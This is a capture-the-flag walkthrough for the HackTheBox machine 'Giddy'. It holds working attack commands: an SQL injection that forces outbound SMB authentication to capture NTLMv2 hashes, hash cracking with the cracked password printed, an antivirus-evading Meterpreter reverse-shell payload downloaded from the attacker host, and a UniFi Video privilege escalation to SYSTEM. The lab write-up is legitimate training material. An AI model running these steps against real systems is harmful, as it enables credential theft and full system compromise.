---
layout: post
title: Hackthebox Giddy Writeup
categories: HackTheBox
---

<img src="/public/images/2019-02-27/giddy_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Giddy" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- -sV -sC 10.10.10.104
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-16 11:11 EET
Nmap scan report for 10.10.10.104
Host is up (0.037s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2019-02-16T09:03:25+00:00; -9m44s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2019-02-14T21:04:56
|_Not valid after:  2019-08-16T21:04:56
|_ssl-date: 2019-02-16T09:03:26+00:00; -9m44s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -9m44s, deviation: 0s, median: -9m44s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.45 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.104/

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.104/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2019/02/17 13:46:26 Starting gobuster
=====================================================
/remote (Status: 302)
/mvc (Status: 301)
/Remote (Status: 302)
=====================================================
2019/02/17 14:00:26 Finished
=====================================================
{% endhighlight %}

Gobuster HTTPS:
{% highlight shell %}
root@kali:~# gobuster -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u https://10.10.10.104/

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.104/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2019/02/17 14:03:14 Starting gobuster
=====================================================
/remote (Status: 302)
/mvc (Status: 301)
/Remote (Status: 302)
=====================================================
2019/02/17 14:17:30 Finished
=====================================================
{% endhighlight %}

Sounds like we have same website on port 80 and on port 443.

### 2.Getting User
We have found 2 interesting pages.
{% highlight shell %}
/remote -> redirects to Windows Powershell Web Access
/mvc    -> product list page
{% endhighlight %}

Product List page:
![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-26-21-09-31.png)

If we click each product of this list, we can redirect to following url like this.

{% highlight shell %}
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18
{% endhighlight %}

And, if we add a single quote end of this url, we can get this error

![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-26-19-00-57.png)

This means that Product.aspx has SQL injection vulnerability.<br>
In this case, we can actually use an undocumented stored procedure for MSSQL to steal SMB credentials.<br>
At first, we have to run our own SMB server to receive connection. We can do this with Metasploit module.

{% highlight shell %}
msf5 > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/smb) > set johnpwfile /root/pw.txt
johnpwfile => /root/pw.txt
msf5 auxiliary(server/capture/smb) > set srvhost 10.10.14.23
srvhost => 10.10.14.23
msf5 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.

[*] Started service listener on 10.10.14.23:445 
[*] Server started.
{% endhighlgiht %}

Then, open sql-shell with sqlmap and execute command "xp_dirtree".<br>

{% highlight shell %}
root@kali:/home/sabonawa# sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18 --sql-shell

~~~

sql-shell> EXEC master..xp_dirtree '\\10.10.14.23\baa,foo'
[19:14:59] [WARNING] reflective value(s) found and filtering out
EXEC master..xp_dirtree '\\10.10.14.23\baa,foo':    'NULL'
sql-shell>
{% endhighlight %}

Then, we can receive some SMB connections from Giddy.<br>

{% highlight shell %}
msf5 auxiliary(server/capture/smb) > [*] SMB Captured - 2019-02-26 20:51:20 +0200
NTLMv2 Response Captured from 10.10.10.104:49723 - 10.10.10.104
USER:Stacy DOMAIN:GIDDY OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:79b0c0199a0ea376964a588b6e689534 
NT_CLIENT_CHALLENGE:0101000000000000d45342d902ced40113e8c7ee19074eb600000000020000000000000000000000
[*] SMB Captured - 2019-02-26 20:51:20 +0200
NTLMv2 Response Captured from 10.10.10.104:49723 - 10.10.10.104
USER:Stacy DOMAIN:GIDDY OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:Disabled
NTHASH:eb7cabc3257b6e1fb783257dc135c6e9 
NT_CLIENT_CHALLENGE:010100000000000037b84ad902ced4011bbb4ce038500d1800000000020000000000000000000000
[*] SMB Captured - 2019-02-26 20:51:20 +0200
NTLMv2 Response Captured from 10.10.10.104:49723 - 10.10.10.104
USER:Stacy DOMAIN:GIDDY OS: LM:
LMHASH:Disabled 
LM_CLIENT_CHALLENGE:

~~~

{% endhighlight %}

At the same time, we can achieve john format password file in specified path.

{% highlight shell %}
sabonawa@kali:/root$ cat pw.txt_netntlmv2 
Stacy::GIDDY:1122334455667788:61ae7af3ca2b17f741a536b66dbc5f47:01010000000000006b068f63f5cdd401e9d1374089ee722200000000020000000000000000000000
Stacy::GIDDY:1122334455667788:823e63d2c40f8e7371451b6d427df435:0101000000000000ab809663f5cdd401fbb9f8a8f29f23cf00000000020000000000000000000000
Stacy::GIDDY:1122334455667788:a6f46c56847372412f2f2efbdc91b3e4:0101000000000000add89d63f5cdd4014b711016199a5cae00000000020000000000000000000000
Stacy::GIDDY:1122334455667788:970b31084f1159dc5f3f88d8634ff3ce:01010000000000004415a463f5cdd401f908739a8756930d00000000020000000000000000000000
Stacy::GIDDY:1122334455667788:592a79993ce2d680292578c0e91571e3:01010000000000004bf3aa63f5cdd40108bfb0813046619500000000020000000000000000000000
Stacy::GIDDY:1122334455667788:fcb7261b28331781821024526c79f785:0101000000000000a930b363f5cdd4019db3fefd5e58060500000000020000000000000000000000
Stacy::GIDDY:1122334455667788:0ac3c4f1fe26f6599525c45777f42b73:01010000000000002147bb63f5cdd401af7ab7fa325a1f5500000000020000000000000000000000
Stacy::GIDDY:1122334455667788:79b0c0199a0ea376964a588b6e689534:0101000000000000d45342d902ced40113e8c7ee19074eb600000000020000000000000000000000
Stacy::GIDDY:1122334455667788:eb7cabc3257b6e1fb783257dc135c6e9:010100000000000037b84ad902ced4011bbb4ce038500d1800000000020000000000000000000000
Stacy::GIDDY:1122334455667788:5dabf08a9de326467d01a72d9ba6f5b8:0101000000000000d8ce52d902ced4017897364fc904360d00000000020000000000000000000000
Stacy::GIDDY:1122334455667788:75d8f9037b40c122710c63b8ec08ffa6:0101000000000000f8965ad902ced4014cf4bac6d908990700000000020000000000000000000000
Stacy::GIDDY:1122334455667788:740c59b5f734961f36bba56c5372ffd0:01010000000000006bad62d902ced40133b27c1378cc3db400000000020000000000000000000000
Stacy::GIDDY:1122334455667788:76eec2d84159141f7d182858182551c4:010100000000000015396bd902ced4010b71ac2a4d8cf7c300000000020000000000000000000000
Stacy::GIDDY:1122334455667788:d15bc192d677e500da515fd590225bb1:0101000000000000a1c473d902ced4015cc71ed4942c2b6f00000000020000000000000000000000
{% endhighlight %}

This time, we got username "GIDDY/STACY" and its NTHASH.<br>
By using john the ripper, we can achieve a password for user stacy.

{% highlight shell %}
root@kali:~# john pw.txt_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 14 password hashes with 14 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
xNnWo6272k7x     (Stacy)
14g 0:00:00:07 DONE (2019-02-26 21:01) 1.806g/s 348820p/s 4883Kc/s 4883KC/s xevood..wtkate
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

Now, we have username and password to login to Powershell Web Access.

![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-26-21-06-26.png)

Since we have powershell, we can easily access to user.txt.

![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-26-21-12-40.png)

### 3.Getting Root
After logged in the Powershell console, we can find that there is an interesting file

![placeholder](https://inar1.github.io/public/images/2019-02-27/2019-02-27-12-56-50.png)

By using searchsploit, we can find a <a href="https://www.exploit-db.com/exploits/43390">Local Privilege Escalation</a>.
{% highlight shell %}
root@kali:~# searchsploit unifi video
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                     |  Path
                                                                                                                   | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Ubiquiti Networks UniFi Video Default - 'crossdomain.xml' Security Bypass                                          | exploits/php/webapps/39268.java
Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation                                                            | exploits/windows/local/43390.txt
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

This means, if we have a permission for writting C:\ProgramData\unifi-video, We can write a file "taskkill.exe" in that folder.
By default that file does not exist. However, "Unifi Video" still tries to execute it with privileged permission when it restarts.

Payload creation:<br>
This time, to avoid antivirus, we use a Metasploit evasion module.
{% highlight shell %}
msf5 evasion(windows/windows_defender_exe) > use evasion/windows/windows_defender_exe 
msf5 evasion(windows/windows_defender_exe) > set payload windows/meterpreter_reverse_https
payload => windows/meterpreter_reverse_https
msf5 evasion(windows/windows_defender_exe) > set lport 443
lport => 443
msf5 evasion(windows/windows_defender_exe) > set lhost tun0
lhost => tun0
msf5 evasion(windows/windows_defender_exe) > set filename taskkill.exe
filename => taskkill.exe
msf5 evasion(windows/windows_defender_exe) > run

[*] Compiled executable size: 184320
[+] taskkill.exe stored at /root/.msf4/local/taskkill.exe
{% endhighlight %}

Then, we had our payload in the Phantom-Evasion directory.<br>
Next, run a simple webserver to let Giddy download the "taskkill.exe"

{% highlight shell %}
root@kali:~/.msf4/local# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
{% endhighlight %}

After that, launch a reverse shell handler with Metasploit.

{% highlight shell %}
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter_reverse_https
payload => windows/meterpreter_reverse_https
msf5 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf5 exploit(multi/handler) > set lport 443
lport => 443
msf5 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://10.10.14.23:443
{% endhighlight %}

To download "taskkill.exe" on our host, cd to "C:\ProgramData\unifi-video" and execute a command on Giddy.

{% highlight shell %}
PS C:\Users\Stacy\Documents> 
cd C:\ProgramData
PS C:\ProgramData> 
cd unifi-video
PS C:\ProgramData\unifi-video> 
Invoke-WebRequest -o taskkill.exe http://10.10.14.23/taskkill.exe
PS C:\ProgramData\unifi-video> 
dir
 
    Directory: C:\ProgramData\unifi-video
 
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        6/16/2018   9:54 PM                bin                                                                   
d-----        6/16/2018   9:55 PM                conf                                                                  
d-----        6/16/2018  10:56 PM                data                                                                  
d-----        6/16/2018   9:54 PM                email                                                                 
d-----        6/16/2018   9:54 PM                fw                                                                    
d-----        6/16/2018   9:54 PM                lib                                                                   
d-----        2/25/2019  12:12 AM                logs                                                                  
d-----        6/16/2018   9:55 PM                webapps                                                               
d-----        6/16/2018   9:55 PM                work                                                                  
-a----        7/26/2017   6:10 PM         219136 avService.exe                                                         
-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log                                                    
-a----        6/17/2018  11:23 AM      534204321 hs_err_pid1992.mdmp                                                   
-a----        8/16/2018   7:47 PM              0 hs_err_pid2036.mdmp                                                   
-a----        2/27/2019   2:00 AM         254976 taskkill.exe                                                          
-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk                                              
-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe                                                        
-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico                                                        
-a----        6/16/2018   9:54 PM          89050 Uninstall.exe                                                         

{% endhighlight %}

Then, restart service "Ubiquiti UniFi Video"
{% highlight shell %}
PS C:\ProgramData\unifi-video> 
Stop-Service "Ubiquiti UniFi Video"

~~~

PS C:\ProgramData\unifi-video> 
Start-Service "Ubiquiti UniFi Video"

~~~

{% endhighlight %}

With these procedure, we can see that we got a meterpreter shell.<br>
Which has privilege of NT AUTHORITY\SYSTEM.

{% highlight shell %}
[*] Started HTTPS reverse handler on https://10.10.14.23:443
[*] https://10.10.14.23:443 handling request from 10.10.10.104; (UUID: fhbxmi4j) Redirecting stageless connection from /zhbkjtSs9OjYs9myhMWwjg8W-NNUTkclqLtPZjGEDiL1a5TuI with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] https://10.10.14.23:443 handling request from 10.10.10.104; (UUID: fhbxmi4j) Attaching orphaned/stageless session...
[*] Meterpreter session 1 opened (10.10.14.23:443 -> 10.10.10.104:49708) at 2019-02-27 12:36:46 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
{% endhighlight %}

As usual, root.txt is in the directory "C:\Users\Administrator\Desktop".

{% highlight shell %}
meterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  842   fil   2018-06-17 04:54:54 +0300  Ubiquiti UniFi Video.lnk
100666/rw-rw-rw-  282   fil   2018-06-17 03:56:45 +0300  desktop.ini
100666/rw-rw-rw-  32    fil   2018-06-17 17:53:24 +0300  root.txt

meterpreter > cat root.txt
CF559C6C121F683BF3E56891E80641B1
{% endhighlight %}
